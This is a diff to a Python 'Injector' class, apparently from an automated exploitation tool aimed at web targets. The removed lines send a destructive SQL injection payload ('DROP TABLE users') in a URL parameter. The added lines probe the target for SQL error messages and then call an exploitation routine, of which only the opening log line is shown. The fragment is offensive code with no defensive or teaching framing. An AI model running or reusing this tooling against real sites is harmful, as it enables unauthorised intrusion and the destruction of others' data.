@@ -7,12 +7,15 @@ class Injector:
         self.logger = logger
 
     def inject(self):
-        self.logger.log("Performing SQL Injection...")
-        payload = "'; DROP TABLE users; --"
-        full_url = f"{self.url}?id={payload}"
-        self.logger.log(f"Injecting URL: {full_url}")
-        response = HttpUtils.send_request(full_url)
+        self.logger.log("Performing automatic exploitation...")
+        response = HttpUtils.send_request(self.url)
         if response:
-            self.logger.log(f"SQL Injection successful, response: {response.text[:100]}...")  # Log only first 100 characters for brevity
+            if "SQL syntax error" in response.text:
+                self.exploit_sql_injection()
+            else:
+                self.logger.log("No known vulnerability detected.")
         else:
-            self.logger.log("SQL Injection failed, no response received.")
+            self.logger.log("Failed to get a response from the target.")
+
+    def exploit_sql_injection(self):
+        self.logger.log("SQL Injection detected, performing exploitation...")
